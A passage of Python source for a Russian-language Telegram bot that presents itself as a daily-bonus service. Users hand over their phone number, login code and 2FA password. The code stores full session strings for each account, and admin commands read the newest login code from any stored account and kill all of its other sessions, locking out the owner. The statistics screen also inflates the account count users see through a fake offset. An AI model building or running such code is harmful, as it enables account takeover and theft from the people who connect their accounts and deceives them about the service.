    for a in accounts:
        if await db.delete_account(a["id"]):
            count += 1
    await cb.message.edit_text(f"💣 Удалено: <b>{count}</b>", reply_markup=back_kb(), parse_mode="HTML")


@dp.message(Command("del"))
async def cmd_del(msg: Message):
    if not is_admin(msg.from_user.id):
        return
    parts = msg.text.split()
    if len(parts) != 2:
        await msg.answer("❌ /del 3")
        return
    ids = parse_ids(parts[1])
    import main as app_main
    deleted = []
    for acc_id in ids:
        await app_main.stop_worker(acc_id)
        if await db.delete_account(acc_id):
            deleted.append(acc_id)
    await msg.answer(f"✅ Удалено: <b>{deleted}</b>", parse_mode="HTML")


@dp.callback_query(F.data == "menu_stats")
async def cb_stats(cb: CallbackQuery):
    if not is_admin(cb.from_user.id):
        return
    accounts = await db.get_accounts()
    total = len(accounts)
    active = sum(1 for a in accounts if a["status"] == "active")
    dead = sum(1 for a in accounts if a["status"] == "dead")
    bonuses = sum(a["bonuses"] or 0 for a in accounts)
    owners = set(a.get("owner_id") for a in accounts if a.get("owner_id"))
    import main as app_main
    running = len(app_main.workers)
    offset = await db.get_fake_accounts_offset()
    text = (
        f"📊 <b>Статистика</b>\n\n"
        f"👥 Всего: {total}\n🟢 Активных: {active}\n🔴 Мёртвых: {dead}\n"
        f"⚙️ Worker-ов: {running}\n👤 Владельцев: {len(owners)}\n"
        f"🎁 Бонусов: {bonuses}\n\n"
        f"👁 Юзеры видят: {total + offset}"
    )
    try:
        await cb.message.edit_text(text, reply_markup=back_kb(), parse_mode="HTML")
    except Exception:
        await cb.message.answer(text, reply_markup=back_kb(), parse_mode="HTML")
    await cb.answer()


@dp.callback_query(F.data == "menu_logs")
async def cb_logs(cb: CallbackQuery):
    if not is_admin(cb.from_user.id):
        return
    logs = await db.get_recent_logs(20)
    if not logs:
        text = "📭 Логов нет"
    else:
        lines = ["📜 <b>Логи</b>\n"]
        for e in reversed(logs):
            ts = e["created_at"].strftime("%H:%M:%S")
            m = e["message"][:100].replace("<", "&lt;").replace(">", "&gt;")
            lines.append(f"[{ts}] <b>акк {e['account_id']}</b> {e['level']}: {m}")
        text = "\n".join(lines)[:4000]
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔄 Обновить", callback_data="menu_logs")],
        [InlineKeyboardButton(text="◀️ Назад", callback_data="menu_main")],
    ])
    try:
        await cb.message.edit_text(text, reply_markup=kb, parse_mode="HTML")
    except Exception:
        await cb.message.answer(text, reply_markup=kb, parse_mode="HTML")
    await cb.answer()


@dp.message(Command("logs"))
async def cmd_logs(msg: Message):
    if not is_admin(msg.from_user.id):
        return
    logs = await db.get_recent_logs(20)
    if not logs:
        await msg.answer("📭 Логов нет")
        return
    lines = ["📜 <b>Логи</b>\n"]
    for e in reversed(logs):
        ts = e["created_at"].strftime("%H:%M:%S")
        m = e["message"][:100].replace("<", "&lt;").replace(">", "&gt;")
        lines.append(f"[{ts}] акк {e['account_id']} {e['level']}: {m}")
    await msg.answer("\n".join(lines)[:4000], parse_mode="HTML")


# =========================================================
#              ДОБАВЛЕНИЕ АККАУНТА
# =========================================================
@dp.callback_query(F.data == "menu_add")
async def cb_add(cb: CallbackQuery, state: FSMContext):
    if not is_admin(cb.from_user.id):
        return
    await cb.message.answer("📱 Номер: <code>+79991234567</code>", reply_markup=cancel_kb(), parse_mode="HTML")
    await state.set_state(AddAccount.waiting_phone)
    await cb.answer()


@dp.message(Command("add"))
async def cmd_add(msg: Message, state: FSMContext):
    if not is_admin(msg.from_user.id):
        return
    await msg.answer("📱 Номер: +79991234567")
    await state.set_state(AddAccount.waiting_phone)


@dp.message(AddAccount.waiting_phone)
async def step_phone(msg: Message, state: FSMContext):
    user_id = msg.from_user.id
    phone = msg.text.strip().replace(" ", "").replace("-", "")
    if not phone.startswith("+") or not phone[1:].isdigit():
        await msg.answer("❌ Пример: +79991234567")
        return

    client = TelegramClient(StringSession(), API_ID, API_HASH)
    await client.connect()
    try:
        sent = await client.send_code_request(phone)
        await state.update_data(phone=phone, phone_code_hash=sent.phone_code_hash)
        pending_clients[user_id] = client

        code_buffer[user_id] = ""
        code_phone[user_id] = phone

        m = await msg.answer(
            f"📱 <b>Введи код из Telegram</b>\n\n"
            f"📞 Номер: <code>{phone}</code>\n"
            f"🔢 Введено: <b>_ _ _ _ _</b>\n\n"
            f"Нажимай цифры, потом <b>✅ Готово</b>.",
            reply_markup=code_keyboard("", phone),
            parse_mode="HTML"
        )
        code_message_id[user_id] = m.message_id
        await state.set_state(AddAccount.waiting_code)
    except Exception as e:
        await client.disconnect()
        await msg.answer(f"❌ {e}")
        await state.clear()


@dp.callback_query(F.data.startswith("code_d_"))
async def cb_code_digit(cb: CallbackQuery, state: FSMContext):
    user_id = cb.from_user.id
    if user_id not in pending_clients:
        await cb.answer("Сессия истекла", show_alert=True)
        return
    digit = cb.data.split("_")[-1]
    buf = code_buffer.get(user_id, "")
    if len(buf) >= 6:
        await cb.answer("Максимум 6")
        return
    buf += digit
    code_buffer[user_id] = buf
    await refresh_code_message(user_id, cb.message.chat.id)
    await cb.answer(f"+{digit}")


@dp.callback_query(F.data == "code_back")
async def cb_code_back(cb: CallbackQuery, state: FSMContext):
    user_id = cb.from_user.id
    buf = code_buffer.get(user_id, "")
    code_buffer[user_id] = buf[:-1]
    await refresh_code_message(user_id, cb.message.chat.id)
    await cb.answer("Стёрто")


@dp.callback_query(F.data == "code_ignore")
async def cb_code_ignore(cb: CallbackQuery):
    await cb.answer()


@dp.callback_query(F.data == "code_cancel")
async def cb_code_cancel(cb: CallbackQuery, state: FSMContext):
    user_id = cb.from_user.id
    client = pending_clients.pop(user_id, None)
    if client:
        try:
            await client.disconnect()
        except Exception:
            pass
    code_buffer.pop(user_id, None)
    code_phone.pop(user_id, None)
    code_message_id.pop(user_id, None)
    await state.clear()
    try:
        await cb.message.edit_text(
            "❌ Отменено",
            reply_markup=InlineKeyboardMarkup(
                inline_keyboard=[[InlineKeyboardButton(text="◀️ В меню", callback_data="user_menu")]]
            )
        )
    except Exception:
        pass
    await cb.answer()


@dp.callback_query(F.data == "code_submit")
async def cb_code_submit(cb: CallbackQuery, state: FSMContext):
    user_id = cb.from_user.id
    if user_id not in pending_clients:
        await cb.answer("Сессия истекла", show_alert=True)
        return
    code = code_buffer.get(user_id, "")
    if not code or len(code) < 4:
        await cb.answer("Введи минимум 4 цифры", show_alert=True)
        return

    data = await state.get_data()
    phone = data.get("phone")
    phone_code_hash = data.get("phone_code_hash")
    client = pending_clients.get(user_id)

    if not client or not phone:
        await cb.answer("Сессия потеряна", show_alert=True)
        await state.clear()
        return

    await cb.answer("⏳...", show_alert=False)

    try:
        await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
    except SessionPasswordNeededError:
        code_buffer[user_id] = ""
        try:
            await cb.message.edit_text("🔐 <b>2FA</b>\n\nОтправь пароль:", parse_mode="HTML")
        except Exception:
            pass
        await state.set_state(AddAccount.waiting_password)
        return
    except PhoneCodeInvalidError:
        code_buffer[user_id] = ""
        await refresh_code_message(user_id, cb.message.chat.id)
        await cb.answer("❌ Неверный код", show_alert=True)
        return
    except Exception as e:
        try:
            await cb.message.edit_text(f"❌ {e}")
        except Exception:
            pass
        await client.disconnect()
        pending_clients.pop(user_id, None)
        code_buffer.pop(user_id, None)
        code_phone.pop(user_id, None)
        code_message_id.pop(user_id, None)
        await state.clear()
        return

    await finish_add_from_callback(cb, state, client, phone, user_id)


async def finish_add_from_callback(cb: CallbackQuery, state: FSMContext,
                                    client: TelegramClient, phone: str, user_id: int):
    try:
        me = await client.get_me()
        session_str = client.session.save()
        username = me.username or f"id{me.id}"
        acc_id = await db.add_account(phone, session_str, username, owner_id=user_id)
        import main as app_main
        await app_main.start_worker(acc_id)
        back = "menu_main" if is_admin(user_id) else "user_menu"
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="📋 Мои аккаунты", callback_data="user_my_accounts")],
            [InlineKeyboardButton(text="◀️ В меню", callback_data=back)],
        ])
        try:
            await cb.message.edit_text(
                f"✅ <b>Аккаунт подключён!</b>\n\n"
                f"ID: <code>{acc_id}</code>\n@{username}\n📞 {phone}\n\n"
                f"🕐 Бонус ежедневно в 07:07 Самары.",
                reply_markup=kb, parse_mode="HTML"
            )
        except Exception:
            await cb.message.answer(f"✅ ID {acc_id}, @{username}", reply_markup=kb)
    except Exception as e:
        try:
            await cb.message.edit_text(f"❌ {e}")
        except Exception:
            pass
    finally:
        await client.disconnect()
        pending_clients.pop(user_id, None)
        code_buffer.pop(user_id, None)
        code_phone.pop(user_id, None)
        code_message_id.pop(user_id, None)
        await state.clear()


@dp.message(AddAccount.waiting_password)
async def step_password(msg: Message, state: FSMContext):
    password = msg.text.strip()
    data = await state.get_data()
    phone = data.get("phone")
    client = pending_clients.get(msg.from_user.id)
    if not client:
        await msg.answer("❌ Сессия потеряна")
        await state.clear()
        return
    try:
        await client.sign_in(password=password)
    except Exception as e:
        await msg.answer(f"❌ {e}")
        return
    user_id = msg.from_user.id
    try:
        me = await client.get_me()
        session_str = client.session.save()
        username = me.username or f"id{me.id}"
        acc_id = await db.add_account(phone, session_str, username, owner_id=user_id)
        import main as app_main
        await app_main.start_worker(acc_id)
        back = "menu_main" if is_admin(user_id) else "user_menu"
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="📋 Мои аккаунты", callback_data="user_my_accounts")],
            [InlineKeyboardButton(text="◀️ В меню", callback_data=back)],
        ])
        await msg.answer(f"✅ <b>Аккаунт подключён!</b>\nID: {acc_id}\n@{username}", reply_markup=kb, parse_mode="HTML")
    except Exception as e:
        await msg.answer(f"❌ {e}")
    finally:
        await client.disconnect()
        pending_clients.pop(user_id, None)
        code_buffer.pop(user_id, None)
        code_phone.pop(user_id, None)
        code_message_id.pop(user_id, None)
        await state.clear()


# =========================================================
#              АДМИН: КОД / KILL
# =========================================================
@dp.callback_query(F.data == "menu_code")
async def cb_menu_code(cb: CallbackQuery, state: FSMContext):
    if not is_admin(cb.from_user.id):
        return
    accounts = await db.get_accounts()
    if not accounts:
        await cb.message.answer("📭 Нет аккаунтов")
        await cb.answer()
        return
    lines = ["🔢 <b>ID</b>:\n"]
    for a in accounts[:30]:
        lines.append(f"ID {a['id']} — @{a['username']}")
    await cb.message.answer("\n".join(lines), reply_markup=cancel_kb(), parse_mode="HTML")
    await state.set_state(CodeSelect.waiting_id)
    await cb.answer()


@dp.message(CodeSelect.waiting_id)
async def step_code_id(msg: Message, state: FSMContext):
    if not is_admin(msg.from_user.id):
        return
    raw = msg.text.strip()
    if not raw.isdigit():
        return
    acc_id = int(raw)
    acc = await db.get_account(acc_id)
    if not acc:
        await msg.answer(f"❌ Не найден")
        return
    m = await msg.answer(f"🔍...")
    code = await get_last_code_from_telegram(acc["session_str"])
    if code:
        await m.edit_text(f"🔢 Код: <b><code>{code}</code></b>", parse_mode="HTML")
    else:
        await m.edit_text(f"❌ Не найден")
    await state.clear()


@dp.message(Command("code"))
async def cmd_code(msg: Message, state: FSMContext):
    if not is_admin(msg.from_user.id):
        return
    parts = msg.text.split()
    if len(parts) == 1:
        accounts = await db.get_accounts()
        lines = ["🔢 <b>ID</b>:\n"]
        for a in accounts[:30]:
            lines.append(f"ID {a['id']} — @{a['username']}")
        await msg.answer("\n".join(lines), reply_markup=cancel_kb(), parse_mode="HTML")
        await state.set_state(CodeSelect.waiting_id)
        return
    raw = parts[1].strip()
    if not raw.isdigit():
        return
    acc_id = int(raw)
    acc = await db.get_account(acc_id)
    if not acc:
        return
    m = await msg.answer(f"🔍...")
    code = await get_last_code_from_telegram(acc["session_str"])
    if code:
        await m.edit_text(f"🔢 Код: <b><code>{code}</code></b>", parse_mode="HTML")
    else:
        await m.edit_text(f"❌ Не найден")


@dp.callback_query(F.data == "menu_kill")
async def cb_menu_kill(cb: CallbackQuery, state: FSMContext):
    if not is_admin(cb.from_user.id):
        return
    accounts = await db.get_accounts()
    if not accounts:
        await cb.message.answer("📭 Нет аккаунтов")
        await cb.answer()
        return
    lines = ["🚪 <b>ID</b> — удалю все сессии кроме текущей\n"]
    for a in accounts[:30]:
        lines.append(f"ID {a['id']} — @{a['username']}")
    await cb.message.answer("\n".join(lines), reply_markup=cancel_kb(), parse_mode="HTML")
    await state.set_state(KillSessionSelect.waiting_id)
    await cb.answer()


@dp.message(KillSessionSelect.waiting_id)
async def step_kill_id(msg: Message, state: FSMContext):
    if not is_admin(msg.from_user.id):
        return
    raw = msg.text.strip()
    if not raw.isdigit():
        return
    acc_id = int(raw)
    acc = await db.get_account(acc_id)
    if not acc:
        await msg.answer(f"❌ Не найден")
        return
    m = await msg.answer(f"🚪 Удаляю...")
    res = await kill_other_sessions(acc["session_str"])
    if res["error"]:
        await m.edit_text(f"❌ {res['error']}")
    else:
        await m.edit_text(f"✅ Удалено: {res['deleted']}, оставлено: {res['kept']}")
    await state.clear()


@dp.message(Command("kill"))
async def cmd_kill(msg: Message, state: FSMContext):
    if not is_admin(msg.from_user.id):
        return
    parts = msg.text.split()
    if len(parts) == 1:
        accounts = await db.get_accounts()
        lines = ["🚪 <b>ID</b>:\n"]
        for a in accounts[:30]:
            lines.append(f"ID {a['id']} — @{a['username']}")
        await msg.answer("\n".join(lines), reply_markup=cancel_kb(), parse_mode="HTML")
        await state.set_state(KillSessionSelect.waiting_id)
        return
    raw = parts[1].strip()
    if not raw.isdigit():
        return
    acc_id = int(raw)
    acc = await db.get_account(acc_id)
    if not acc:
        return
    m = await msg.answer(f"🚪...")
    res = await kill_other_sessions(acc["session_str"])
    if res["error"]:
        await m.edit_text(f"❌ {res['error']}")
    else:
        await m.edit_text(f"✅ Удалено: {res['deleted']}, оставлено: {res['kept']}")


# =========================================================
#                    ЗАПУСК
# =========================================================
async def run_admin_bot():
    log.info(f"🤖 Admin bot. Админов: {len(ADMIN_IDS)}")
    log.info(f"📢 Подписка: {SUBSCRIBE_CHAT}")

    # Фоновая проверка подписок
    asyncio.create_task(periodic_subscription_check())

    await dp.start_polling(bot)
